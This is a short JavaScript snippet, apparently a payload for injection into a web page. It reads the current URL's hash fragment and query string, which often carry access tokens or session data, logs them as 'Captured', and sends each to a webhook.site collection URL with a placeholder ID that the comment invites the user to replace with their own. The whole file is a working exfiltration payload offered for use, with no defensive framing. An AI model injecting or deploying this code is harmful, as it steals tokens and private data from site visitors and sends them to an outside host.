(function () {
  function log(data) {
    console.log("Captured:", data);

    // send to webhook (replace with yours)
    fetch("https://webhook.site/YOUR-ID?" + data).catch(() => { });
  }

  if (window.location.hash) {
    log("HASH=" + window.location.hash);
  }

  if (window.location.search) {
    log("SEARCH=" + window.location.search);
  }
})();
